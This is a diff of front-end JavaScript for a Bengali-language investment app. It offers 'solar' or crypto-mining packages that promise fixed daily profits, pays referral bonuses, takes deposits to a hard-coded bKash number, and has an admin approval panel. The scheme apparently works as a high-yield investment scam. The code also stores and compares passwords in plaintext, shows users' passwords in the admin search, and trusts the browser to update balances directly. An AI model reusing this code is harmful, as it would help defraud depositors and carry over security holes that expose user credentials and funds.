-  const userRef = db.collection('users').doc(cur);
-  const userDoc = await userRef.get();
-  const me = userDoc.data();
-  
-  me.deposits.push({id:'dep_'+Date.now(), plan, amount, tx, status:'pending', date:dateTimeStr});
-  await userRef.update({ deposits: me.deposits });
-  
-  const tgMsg = `📥 <b>নতুন ডিপোজিট রিকোয়েস্ট এসেছে!</b>\n\n👤 ইউজার আইডি: <code>${cur}</code>\n📦 ইনভেস্ট প্ল্যান: <b>${plan}</b>\n💰 পরিমাণ: <b>${amount} ৳</b>\n⛓️ TxID: <code>${tx}</code>\n⏰ সময় ও তারিখ: <i>${dateTimeStr}</i>\n\n👉 দ্রুত আপনার বিকাশ অ্যাকাউন্ট চেক করে রিকোয়েস্টটি এপ্রুভ করুন।`;
-  sendTelegramNotice(tgMsg);
+function copyNumber(){ navigator.clipboard.writeText('01797025790'); showToast('নম্বর কপি করা হয়েছে!'); }
+function copyRefLink(){ navigator.clipboard.writeText($('refLinkField').value); showToast('রেফারেল লিংক কপি হয়েছে!'); }
 
-  showToast('ডিপোজিট সাবমিট হয়েছে! এডমিন ভেরিফাই করলে ব্যালেন্স ও প্যাক একটিভ হবে।');
+async function executeDeposit(){
+  const plan = $('targetPlanName').value;
+  const amount = Number($('depositAmountField').value);
+  const tx = $('depositTxField').value.trim();
+  if(!tx) return showToast('দয়া করে ট্রানজেকশন আইডি (TxID) প্রদান করুন');
+  if(amount <= 0) return showToast('সঠিক টাকা নির্বাচন করুন');
+
+  const s = getUserSession();
+  const ref = db.collection('users').doc(s);
+  const uData = (await ref.get()).data();
+  
+  const time = new Date().toLocaleString('bn-BD');
+  uData.deposits.push({ id:'dep_'+Date.now(), plan, amount, tx, status:'pending', date:time });
+  
+  await ref.update({ deposits: uData.deposits });
+  sendTelegramAlert(`📥 <b>নতুন জমা রিকোয়েস্ট!</b>\n\n👤 ইউজার: <code>${s}</code>\n📦 প্ল্যান: ${plan}\n💰 পরিমাণ: ৳${amount}\n⛓️ TxID: <code>${tx}</code>\n🏦 গেটওয়ে: ${selectedGatewayName}`);
+  showToast('জমা রিকোয়েস্ট সাবমিট হয়েছে। অ্যাডমিন প্যানেল যাচায়ের পর সক্রিয় হবে।');
   showPage('home');
 }
 
-async function doDailyCreditIfDue(){
-  const cur = getCurrent(); if(!cur) return;
-  const userRef = db.collection('users').doc(cur);
-  const userDoc = await userRef.get();
-  const me = userDoc.data();
-  if(!me.activePlans || me.activePlans.length === 0) return;
-  
-  const now = Date.now();
-  let totalIncome = 0;
-  let updated = false;
+async function executeWithdraw(){
+  const s = getUserSession();
+  const method = $('witMethodField').value;
+  const num = $('witNumberField').value.trim();
+  const amt = Number($('witAmountField').value);
+  const pass = $('witPassField').value;
 
-  me.activePlans.forEach(plan => {
-    if(now - (plan.lastCreditTs || now) >= 24 * 60 * 60 * 1000){
-      totalIncome += plan.daily;
-      plan.lastCreditTs = now;
-      updated = true;
-    }
+  if(!num || amt < 200) return showToast('সঠিক নম্বর এবং নূন্যতম ২০০ টাকা প্রদান করুন');
+  
+  const ref = db.collection('users').doc(s);
+  const user = (await ref.get()).data();
+
+  if(user.password !== pass) return showToast('ভুল অ্যাকাউন্ট সিকিউরিটি পাসওয়ার্ড!');
+  if(amt > user.balance) return showToast('আপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই');
+
+  user.balance -= amt;
+  const time = new Date().toLocaleString('bn-BD');
+  user.withdrawals.push({ id:'wit_'+Date.now(), method, number:num, amount:amt, status:'pending', date:time });
+
+  await ref.update({ balance: user.balance, withdrawals: user.withdrawals });
+  sendTelegramAlert(`💸 <b>নতুন উত্তোলন রিকোয়েস্ট!</b>\n\n👤 ইউজার: <code>${s}</code>\n💰 পরিমাণ: ৳${amt}\n🏦 মেথড: ${method}\n📱 নম্বর: <code>${num}</code>`);
+  showToast('উত্তোলন রিকোয়েস্ট সফলভাবে ওনার ডাটাবেজে পাঠানো হয়েছে');
+  showPage('profile');
+}
+
+function buildIncomeDashboard(u){
+  const activePlans = u.activePlans || [];
+  $('dashTotalProducts').innerText = activePlans.length;
+  
+  const totalInvested = activePlans.reduce((sum,i)=>{
+    const pMeta = SOLAR_PRODUCTS.find(x=>x.id === i.id) || {min:0};
+    return sum + pMeta.min;
+  }, 0);
+  $('dashTotalInvest').innerText = '৳ ' + totalInvested.toFixed(2);
+  
+  const todayEarn = activePlans.reduce((sum,i)=>sum+i.daily, 0);
+  $('dashTodayEarn').innerText = '৳ ' + todayEarn.toFixed(2);
+
+  const totalEarnedTx = (u.deposits || []).filter(x=>x.status==='income_credit').reduce((sum,i)=>sum+i.amount, 0);
+  $('dashTotalEarn').innerText = '৳ ' + totalEarnedTx.toFixed(2);
+  
+  const estTotal = activePlans.reduce((sum,i)=>{
+    const pMeta = SOLAR_PRODUCTS.find(x=>x.id === i.id) || {total:0};
+    return sum + pMeta.total;
+  }, 0);
+  $('dashEstEarn').innerText = '৳ ' + estTotal.toFixed(2);
+
+  const incomeBox = $('incomePlansList'); incomeBox.innerHTML = '';
+  if(activePlans.length === 0){
+    incomeBox.innerHTML = '<div class="empty-box">বর্তমানে আপনার কোনো সক্রিয় বিনিয়োগ অবস্থান নেই।</div>';
+    return;
+  }
+
+  activePlans.forEach(p=>{
+    incomeBox.innerHTML += `
+      <div class="account-asset-card" style="border-left:4px solid var(--nav-active);">
+        <div style="font-weight:bold; font-size:14px; color:var(--accent-gold);">${p.id}</div>
+        <div style="margin-top:6px; font-size:12px; opacity:0.8;">দৈনিক রানিং প্রফিট: ৳${p.daily}</div>
+        <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">পদ্ধতি: অটোমেটিক ক্লাউড মাইনিং (৩৬৫ দিন)</div>
+      </div>
+    `;
   });
+}
 
-  if(updated) {
-    me.balance += totalIncome;
-    await userRef.update({ balance: me.balance, activePlans: me.activePlans });
-    renderAll();
-    showToast(`অভিনন্দন! আপনার সচল প্ল্যানগুলো থেকে ${totalIncome} ৳ অটোমেটিক যোগ হয়েছে।`);
+function toggleIncomeTab(mode){
+  activeIncomeViewMode = mode;
+  $('incActiveTab').classList.toggle('active', mode==='active');
+  $('incExpiredTab').classList.toggle('active', mode==='expired');
+  if(mode === 'expired'){
+    $('incomePlansList').innerHTML = '<div class="empty-box">কোনো মেয়াদোত্তীর্ণ প্যাকেজ রেকর্ড পাওয়া যায়নি।</div>';
+  } else renderModuleEngine();
+}
+
+async function buildTeamView(u){
+  const box = $('teamMembersList'); box.innerHTML = '';
+  if(!u.referrals || u.referrals.length === 0){
+    box.innerHTML = '<div class="empty-box">আপনার রেফারেলে এখনো কোনো সদস্য যুক্ত হয়নি।</div>';
+    return;
   }
+  u.referrals.forEach(r=>{
+    box.innerHTML += `
+      <div class="menu-item" style="margin-bottom:8px;">
+        <div class="menu-left"><span>👤</span> ID: ${r.phone}</div>
+        <span style="font-size:11px; color:var(--text-muted);">${r.joined}</span>
+      </div>
+    `;
+  });
 }
 
-async function requestWithdraw(){
-  const cur = getCurrent();
-  const method = $('wMethod').value; const number = $('wNumber').value.trim(); const amount = Number($('wAmount').value); const pass = $('wPass').value;
-  
-  const userRef = db.collection('users').doc(cur);
-  const userDoc = await userRef.get();
-  const me = userDoc.data();
-  
-  if(!number || amount < 400) return showToast('সঠিক তথ্য দিন (নূন্যতম উইথড্র ৪০০ ৳)');
-  if(amount > me.balance) return showToast('আপনার ওয়ালেটে পর্যাপ্ত টাকা নেই');
-  if(pass !== me.password) return showToast('ভুল পাসওয়ার্ড দিয়েছেন!');
-  
-  const now = new Date();
-  const dateTimeStr = now.toLocaleDateString('bn-BD') + " | " + now.toLocaleTimeString('bn-BD');
-
-  me.balance -= amount;
-  me.withdrawals.push({id:'wit_'+Date.now(), method, number, amount, status:'pending', date:dateTimeStr});
-  await userRef.update({ balance: me.balance, withdrawals: me.withdrawals });
-  
-  const tgMsg = `💸 <b>নতুন টাকা উত্তোলনের (Withdraw) রিকোয়েস্ট!</b>\n\n👤 ইউজার আইডি: <code>${cur}</code>\n💰 পরিমাণ: <b>${amount} ৳</b>\n🏦 মেথড: <b>${method}</b>\n📱 রিসিভ নাম্বার: <code>${number}</code>\n⏰ সময়: <i>${dateTimeStr}</i>\n\n👉 ইউজারকে টাকা সেন্ড করে অ্যাডমিন প্যানেল থেকে এপ্রুভ করুন।`;
-  sendTelegramNotice(tgMsg);
-
-  showToast('উইথড্র রিকোয়েস্ট সফলভাবে পেন্ডিং লিস্টে গেছে।');
-  showPage('withdrawHistory');
+function buildTxHistoryList(u){
+  filterTxHistory(activeTxFilterMode);
 }
 
-async function changePassword() {
-  const cur = getCurrent();
-  const oldP = $('oldPass').value; const newP = $('newPass').value; const confP = $('confPass').value;
-  
-  const userRef = db.collection('users').doc(cur);
-  const userDoc = await userRef.get();
-  const me = userDoc.data();
-  
-  if(oldP !== me.password) return showToast('বর্তমান পাসওয়ার্ডটি সঠিক নয়!');
-  if(newP.length < 6) return showToast('নতুন পাসওয়ার্ড কমপক্ষে ৬ সংখ্যার হতে হবে');
-  if(newP !== confP) return showToast('কনফার্ম পাসওয়ার্ড মেলেনি!');
-  
-  await userRef.update({ password: newP });
-  showToast('পাসওয়ার্ড সফলভাবে পরিবর্তিত হয়েছে!');
-  $('oldPass').value = ''; $('newPass').value = ''; $('confPass').value = '';
-}
+function filterTxHistory(mode){
+  activeTxFilterMode = mode;
+  $('txAllTab').classList.toggle('active', mode==='all');
+  $('txDepTab').classList.toggle('active', mode==='dep');
+  $('txWitTab').classList.toggle('active', mode==='wit');
 
-async function renderRefLink(me){
-  const cur = getCurrent();
-  if(!me.myRefId) {
-    const randomId = cur === ADMIN_PHONE ? 'cr_admin72' : 'cr_' + Math.random().toString(36).substring(2, 10);
-    await db.collection('users').doc(cur).update({ myRefId: randomId });
-    me.myRefId = randomId;
-  }
-  // এখানে ৪MD (404 Error) ফিক্স করা হলো - ইউজারনেম ফোর্স না করে স্বয়ংক্রিয় লাইভ লিংক নেওয়া হচ্ছে
-  let baseLink = window.location.origin + window.location.pathname;
-  $('refLink').value = baseLink + '?ref=' + me.myRefId;
-}
+  const s = getUserSession();
+  db.collection('users').doc(s).get().then(snap=>{
+    const u = snap.data();
+    const box = $('txHistoryDataBox'); box.innerHTML = '';
+    let list = [];
 
-async function renderLists(me){
-  const fl = $('friendsList'); fl.innerHTML='';
-  let activeDepositorCount = 0; 
-
-  if(me.referrals && me.referrals.length){
-    for (const r of me.referrals) {
-      const actualUserDoc = await db.collection('users').doc(r.phone).get();
-      let totalDep = 0;
-      if(actualUserDoc.exists) {
-        const actualUser = actualUserDoc.data();
-        totalDep = (actualUser.deposits || []).filter(d=>d.status==='success').reduce((sum, d)=>sum+d.amount, 0);
-      }
-      
-      if (totalDep > 0) {
-        activeDepositorCount++;
-        fl.innerHTML += `<div class="listItem">
-          <b>ID: ${r.phone}</b> <span class="muted" style="float:right">জয়েন: ${r.joined}</span>
-          <div style="margin-top:4px; color:var(--accent)">মোট ডিপোজিট করেছে: ${totalDep} ৳</div>
-        </div>`;
-      }
+    if(mode === 'all' || mode === 'dep'){
+      (u.deposits||[]).forEach(d=>{ list.push({ amt:d.amount, title:'জমা ফান্ড রিকোয়েস্ট ('+d.plan+')', type:'deposit', status:d.status, date:d.date, ts:d.id }); });
     }
-  } 
-  
-  if(activeDepositorCount === 0) {
-    fl.innerHTML = '<div class="muted">কোনো ডিপোজিটকারী টিম মেম্বার নেই</div>';
-  }
+    if(mode === 'all' || mode === 'wit'){
+      (u.withdrawals||[]).forEach(w=>{ list.push({ amt:w.amount, title:'উত্তোলন ফান্ড ('+w.method+')', type:'withdraw', status:w.status, date:w.date, ts:w.id }); });
+    }
 
-  const wl = $('withdrawList'); wl.innerHTML='';
-  if(me.withdrawals && me.withdrawals.length){
-    me.withdrawals.slice().reverse().forEach(w=>{
-      wl.innerHTML += `<div class="listItem" style="display:flex; justify-content:space-between; align-items:center;">
-        <div><b>${w.amount} ৳</b><br><small class="muted">${w.date}</small><br><small class="muted" style="color:var(--accent)">${w.method} (${w.number})</small></div>
-        <div style="color:${w.status==='success'?'var(--success)':w.status==='denied'?'var(--danger)':'orange'}; font-weight:bold; font-size:13px;">${w.status.toUpperCase()}</div>
-      </div>`;
-    });
-  } else wl.innerHTML = '<div class="muted">কোনো উইথড্র হিস্ট্রি রেকর্ড নেই</div>';
+    if(list.length === 0){
+      box.innerHTML = '<div class="empty-box">বর্তমানে আপনার কোনো লেনদেনের রেকর্ড নেই।</div>';
+      return;
+    }
 
-  const apl = $('activePlansList'); apl.innerHTML = '';
-  if(me.activePlans && me.activePlans.length) {
-    me.activePlans.forEach(ap => {
-      const matchedPlan = PLANS.find(p => p.id === ap.id);
-      const imgSrc = matchedPlan ? matchedPlan.img : 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png';
-      
-      apl.innerHTML += `
-        <div class="listItem" style="display:flex; align-items:center; gap:15px; padding:15px; background:var(--card-bg);">
-          <img src="${imgSrc}" style="width:50px; height:50px; object-fit:contain;" alt="crypto" />
+    list.sort((a,b)=>b.ts - a.ts);
+    list.forEach(i=>{
+      const color = i.status==='success'?'var(--success)':i.status==='denied'?'var(--danger)':'orange';
+      box.innerHTML += `
+        <div class="menu-item" style="margin-bottom:8px; background:rgba(0,0,0,0.15);">
           <div>
-            <b style="font-size:16px; color:var(--accent);">${ap.id}</b>
-            <div class="muted" style="margin-top:4px;">দৈনিক ইনকাম: <span style="color:var(--success); font-weight:bold;">${ap.daily} ৳</span></div>
-            <div class="muted" style="font-size:11px;">প্যাকেজের মেয়াদ: ৩৬৫ দিন</div>
+            <div style="font-size:13px; font-weight:bold;">${i.title}</div>
+            <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">${i.date}</div>
+          </div>
+          <div style="text-align:right;">
+            <div style="font-weight:bold;">৳ ${i.amt}</div>
+            <div style="font-size:11px; color:${color}; font-weight:bold; margin-top:2px;">${i.status.toUpperCase()}</div>
           </div>
         </div>
       `;
     });
-  } else {
-    apl.innerHTML = '<div class="card" style="text-align:center; padding:20px; color:var(--muted);">আপনার বর্তমানে কোনো একটিভ মাইনিং প্যানেল নেই।</div>';
+  });
+}
+
+async function showChangePassView(){ showPage('changePass'); }
+
+async function executePasswordReset(){
+  const oldP = $('oldPassField').value;
+  const newP = $('newPassField').value;
+  const confP = $('confPassField').value;
+
+  const s = getUserSession();
+  const ref = db.collection('users').doc(s);
+  const user = (await ref.get()).data();
+
+  if(user.password !== oldP) return showToast('বর্তমান পাসওয়ার্ড ভুল লিখেছেন');
+  if(newP.length < 6) return showToast('নতুন পাসওয়ার্ড নূন্যতম ৬ ডিজিট হতে হবে');
+  if(newP !== confP) return showToast('কনফার্ম পাসওয়ার্ড ম্যাচ করেনি');
+
+  await ref.update({ password: newP });
+  showToast('পাসওয়ার্ড সফলভাবে পরিবর্তিত হয়েছে');
+  showPage('profile');
+}
+
+async function processDailyEarningDistribution(){
+  const s = getUserSession(); if(!s) return;
+  const ref = db.collection('users').doc(s);
+  const user = (await ref.get()).data();
+  if(!user.activePlans || user.activePlans.length === 0) return;
+
+  const now = Date.now();
+  let accumulated = 0;
+  let changed = false;
+
+  user.activePlans.forEach(p=>{
+    if(now - (p.lastCreditTs || now) >= 24*60*60*1000){
+      accumulated += p.daily;
+      p.lastCreditTs = now;
+      changed = true;
+    }
+  });
+
+  if(changed){
+    user.balance += accumulated;
+    if(!user.deposits) user.deposits = [];
+    user.deposits.push({ id:'inc_'+Date.now(), plan:'Crypto Mining Auto Credit', amount:accumulated, status:'income_credit', date:new Date().toLocaleString('bn-BD') });
+    await ref.update({ balance: user.balance, activePlans: user.activePlans, deposits: user.deposits });
+    renderModuleEngine();
+    showToast(`💰 দৈনিক মাইনিং প্রফিট ৳${accumulated} আপনার একাউন্টে যোগ হয়েছে!`);
   }
 }
 
-/* ==================== ADMIN SYSTEM CONTROL ==================== */
-$('adminBtn').addEventListener('click', ()=>showPage('adminPanel'));
+function sendTelegramAlert(text) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
+  }).catch(e=>console.log(e));
+}
 
-async function adminShowWithdraws(){
+function logout(){ destroySession(); window.location.reload(); }
+
+/* ==================== ওনার ব্যাকএন্ড অ্যাডমিন কন্ট্রোল লজিক ==================== */
+$('adminBtn').addEventListener('click', ()=>showPage('adminPanelPage'));
+
+async function adminLoadWithdrawals(){
   const snapshot = await db.collection('users').get();
-  let out = '<h4 style="color:var(--accent); margin-bottom:10px;">পেন্ডিং উইথড্র রিকোয়েস্ট:</h4>';
-  let count = 0;
-  snapshot.forEach(doc => {
+  let code = '<h4 style="color:var(--accent-gold); margin-bottom:10px;">পেন্ডিং উইথড্র রিকোয়েস্টস:</h4>';
+  let empty = true;
+  
+  snapshot.forEach(doc=>{
     const u = doc.data();
     (u.withdrawals||[]).forEach(w=>{
       if(w.status === 'pending'){
-        count++;
-        out += `<div class="listItem">
-          <b>ইউজার ফোন: ${u.phone}</b><br>
-          টাকা: ${w.amount} ৳ (${w.method} -> ${w.number})<br><small class="muted">${w.date}</small>
-          <div style="display:flex; gap:10px; margin-top:8px;">
-            <button class="btn" style="background:var(--success); padding:6px; font-size:12px; color:white;" onclick="adminApproveWithdraw('${u.phone}','${w.id}')">Approve</button>
-            <button class="btn" style="background:var(--danger); padding:6px; font-size:12px; color:white;" onclick="adminDenyWithdraw('${u.phone}','${w.id}')">Deny</button>
+        empty = false;
+        code += `
+          <div class="account-asset-card" style="margin-bottom:10px;">
+            <b>ইউজার ফোন: ${u.phone}</b><br>টাকা: ৳${w.amount} (${w.method} -> ${w.number})<br>
+            <div style="display:flex; gap:10px; margin-top:8px;">
+              <button class="tab-btn active" onclick="adminActionWithdraw('${u.phone}','${w.id}','success')">Approve</button>
+              <button class="tab-btn active" style="background:var(--danger);" onclick="adminActionWithdraw('${u.phone}','${w.id}','denied')">Deny & Refund</button>
+            </div>
           </div>
-        </div>`;
+        `;
       }
     });
   });
-  if(count === 0) out += '<p class="muted">কোনো পেন্ডিং উইথড্র নেই।</p>';
-  $('adminResult').innerHTML = out;
+  if(empty) code += '<p style="font-size:12px; opacity:0.6;">কোনো পেন্ডিং উইথড্র রিকোয়েস্ট নেই</p>';
+  $('adminPanelStatusBox').innerHTML = code;
 }
 
-async function adminShowUsers(){
+async function adminLoadUsers(){
   const snapshot = await db.collection('users').get();
-  let out = '<h4 style="color:var(--accent); margin-bottom:10px;">ইউজার অ্যাকাউন্ট ও ডিপোজিট লিস্ট:</h4>';
+  let code = '<h4 style="color:var(--accent-gold); margin-bottom:10px;">ইউজার ও ইনভেস্ট পেমেন্ট অ্যাক্টিভেশন:</h4>';
   
-  out += `<div class="inputGroup" style="margin-bottom:16px; margin-top:5px;">
-            <input id="adminUserSearch" placeholder="🔍 ইউজার মোবাইল নাম্বার দিয়ে খুঁজুন..." oninput="filterAdminUsers()" style="background:rgba(0,0,0,0.4); border:1px solid var(--accent);">
-          </div>
-          <div id="adminUsersContainer">`;
-          
-  snapshot.forEach(doc => {
+  snapshot.forEach(doc=>{
     const u = doc.data();
-    const plansCount = u.activePlans ? u.activePlans.length : 0;
-    out += `<div class="listItem admin-user-item" data-phone="${u.phone}" style="border-left: 3px solid var(--accent)">
-      <b>ফোন: ${u.phone}</b> | ব্যালেন্স: <span style="color:var(--accent)">${u.balance} ৳</span> | একটিভ প্যাক সংখ্যা: ${plansCount}<br>`;
-      if(u.deposits && u.deposits.length){
-        out += `<div style="margin-top:6px; background:rgba(0,0,0,0.3); padding:8px; border-radius:8px;">`;
-        u.deposits.forEach(d=>{
-          out += `<small class="muted">${d.date}</small><br>প্যাক: ${d.plan} | টাকা: ${d.amount} ৳ [<b>${d.status}</b>]`;
-          if(d.status === 'pending'){
-            out += `<br><button class="btn" style="padding:4px; font-size:11px; margin-top:4px; width:auto;" onclick="adminApproveDeposit('${u.phone}','${d.id}', ${d.amount}, '${d.plan}')">Approve Deposit & Pack</button>`;
-          }
-          out += `<br>`;
-        });
-        out += `</div>`;
+    const packCount = u.activePlans ? u.activePlans.length : 0;
+    code += `
+      <div class="account-asset-card" style="margin-bottom:10px; border-left:3px solid var(--accent-gold);">
+        <b>ইউজার: ${u.phone}</b><br>ব্যালেন্স: ৳${u.balance} | একটিভ প্যাক: ${packCount}<br>
+    `;
+    (u.deposits||[]).forEach(d=>{
+      if(d.status === 'pending'){
+        code += `
+          <div style="background:rgba(0,0,0,0.3); padding:8px; border-radius:8px; margin-top:6px; font-size:12px;">
+            প্ল্যান: ${d.plan} | পরিমাণ: ৳${d.amount}<br>TxID: <code>${d.tx}</code><br>
+            <button class="btn-primary" style="padding:6px; font-size:11px; margin-top:6px; border-radius:6px;" onclick="adminActionDeposit('${u.phone}','${d.id}', ${d.amount}, '${d.plan}')">Approve Deposit & Pack</button>
+          </div>
+        `;
       }
-    out += `</div>`;
+    });
+    code += `</div>`;
   });
-  out += `</div>`;
-  $('adminResult').innerHTML = out;
+  $('adminPanelStatusBox').innerHTML = code;
 }
 
-function filterAdminUsers() {
-  const query = $('adminUserSearch').value.trim().toLowerCase();
-  const items = document.querySelectorAll('.admin-user-item');
-  items.forEach(item => {
-    const phone = item.getAttribute('data-phone').toLowerCase();
-    if(phone.includes(query)) {
-      item.style.display = 'block';
-    } else {
-      item.style.display = 'none';
-    }
-  });
-}
-
-async function adminApproveDeposit(userPhone, depId, amount, planName){
-  const userRef = db.collection('users').doc(userPhone);
-  const userDoc = await userRef.get();
-  const u = userDoc.data();
+// মোবাইল নম্বর চার্জ দেওয়ার জন্য অ্যাডমিন কাস্টম ফিল্টার সার্চ ইঞ্জিন ফাংশন
+async function executeAdminSearch(){
+  const keyword = $('adminSearchInput').value.trim();
+  if(!keyword) return showToast('মোবাইল নম্বরটি টাইপ করুন');
   
-  const d = u.deposits.find(x => x.id === depId);
+  const docRef = db.collection('users').doc(keyword);
+  const snap = await docRef.get();
+  
+  let code = `<h4 style="color:var(--accent-gold); margin-bottom:10px;">অনুসন্ধানের ফলাফল (${keyword}):</h4>`;
+  if(!snap.exists){
+    code += '<p style="font-size:12px; opacity:0.6;">এই মোবাইল নম্বরে কোনো অ্যাকাউন্ট পাওয়া যায়নি।</p>';
+  } else {
+    const u = snap.data();
+    const packCount = u.activePlans ? u.activePlans.length : 0;
+    code += `
+      <div class="account-asset-card" style="border:1px solid var(--nav-active);">
+        <b>মোবাইল: ${u.phone}</b><br>
+        পাসওয়ার্ড: <code>${u.password}</code><br>
+        ব্যালেন্স সম্পদ: ৳${u.balance} | একটিভ প্ল্যান: ${packCount} টি<br>
+        <hr style="margin:10px 0; opacity:0.1;">
+        <b>ডিপোজিট হিস্টোরি:</b><br>
+    `;
+    if(!u.deposits || u.deposits.length === 0) code += '<span style="font-size:11px; opacity:0.5;">কোনো ডেটা নেই</span><br>';
+    else {
+      u.deposits.forEach(d=>{
+        code += `<div style="font-size:11px; background:rgba(0,0,0,0.2); padding:5px; border-radius:4px; margin-top:4px;">${d.date} - ${d.plan} - ৳${d.amount} [${d.status.toUpperCase()}] TxID: ${d.tx || 'N/A'}</div>`;
+      });
+    }
+    
+    code += `<br><b>উইথড্র হিস্টোরি:</b><br>`;
+    if(!u.withdrawals || u.withdrawals.length === 0) code += '<span style="font-size:11px; opacity:0.5;">কোনো ডেটা নেই</span><br>';
+    else {
+      u.withdrawals.forEach(w=>{
+        code += `<div style="font-size:11px; background:rgba(0,0,0,0.2); padding:5px; border-radius:4px; margin-top:4px;">${w.date} - ৳${w.amount} to ${w.number} [${w.status.toUpperCase()}]</div>`;
+      });
+    }
+    code += `</div>`;
+  }
+  $('adminPanelStatusBox').innerHTML = code;
+}
+
+async function adminActionDeposit(phone, depId, amt, planName){
+  const ref = db.collection('users').doc(phone);
+  const u = (await ref.get()).data();
+  const d = u.deposits.find(x=>x.id === depId);
   if(d){
     d.status = 'success';
     if(!u.activePlans) u.activePlans = [];
-    const pData = PLANS.find(x => x.id === planName);
-    if(pData) {
-      u.activePlans.push({
-        id: pData.id,
-        daily: pData.daily,
-        lastCreditTs: Date.now()
-      });
-    }
+    const meta = SOLAR_PRODUCTS.find(x=>x.id === planName) || { id:planName, daily:50 };
+    u.activePlans.push({ id: meta.id, daily: meta.daily, lastCreditTs: Date.now() });
+
     if(u.referrer){
-      const refRef = db.collection('users').doc(u.referrer);
-      const refDoc = await refRef.get();
-      if(refDoc.exists){
-        const refData = refDoc.data();
-        const bonus = Math.round(amount * 0.20);
-        await refRef.update({
-          balance: (refData.balance || 0) + bonus,
-          refEarn: (refData.refEarn || 0) + bonus
-        });
+      const pRef = db.collection('users').doc(u.referrer);
+      const pSnap = await pRef.get();
+      if(pSnap.exists){
+        const pData = pSnap.data();
+        const bonus = Math.round(amt * 0.20);
+        await pRef.update({ balance: (pData.balance||0)+bonus, refEarn: (pData.refEarn||0)+bonus });
       }
     }
-    await userRef.update({ deposits: u.deposits, activePlans: u.activePlans });
-    showToast('ডিপোজিট ও নতুন প্যাকেজ এপ্রুভ হয়েছে!');
-    adminShowUsers();
+    await ref.update({ deposits: u.deposits, activePlans: u.activePlans });
+    showToast('ডিপোজিট এবং ক্রিপ্টো মাইনিং প্যাকেজ সক্রিয় হয়েছে!');
+    adminLoadUsers();
   }
 }
 
-async function adminApproveWithdraw(userPhone, wid){
-  const userRef = db.collection('users').doc(userPhone);
-  const userDoc = await userRef.get();
-  const u = userDoc.data();
-  const w = u.withdrawals.find(x=>x.id===wid);
-  if(w) { 
-    w.status = 'success'; 
-    await userRef.update({ withdrawals: u.withdrawals });
-    showToast('উইথড্র রিকোয়েস্ট সফল (SUCCESS)!'); 
-    adminShowWithdraws(); 
+async function adminActionWithdraw(phone, wid, status){
+  const ref = db.collection('users').doc(phone);
+  const u = (await ref.get()).data();
+  const w = u.withdrawals.find(x=>x.id === wid);
+  if(w){
+    w.status = status;
+    if(status === 'denied') u.balance += w.amount;
+    await ref.update({ withdrawals: u.withdrawals, balance: u.balance });
+    showToast('উইথড্র রিকোয়েস্ট আপডেট সম্পন্ন!');
+    adminLoadWithdrawals();
   }
 }
-
-async function adminDenyWithdraw(userPhone, wid){
-  const userRef = db.collection('users').doc(userPhone);
-  const userDoc = await userRef.get();
-  const u = userDoc.data();
-  const w = u.withdrawals.find(x=>x.id===wid);
-  if(w) { 
-    w.status = 'denied'; 
-    u.balance += w.amount; 
-    await userRef.update({ withdrawals: u.withdrawals, balance: u.balance });
-    showToast('উইথড্র বাতিল ও রিফান্ড করা হয়েছে!'); 
-    adminShowWithdraws(); 
-  }
-}
-
-function copyBkash(){ navigator.clipboard.writeText('01797025790'); showToast('বিকাশ নাম্বার কপি হয়েছে'); }
-$('copyRefBtn').addEventListener('click', ()=>{ navigator.clipboard.writeText($('refLink').value); showToast('রেফার লিংক কপি হয়েছে'); });
-function logout(){ logout_process = clearCurrent(); window.location.reload(); }
 </script>
 </body>
-                                                                     </html>
+  </html>
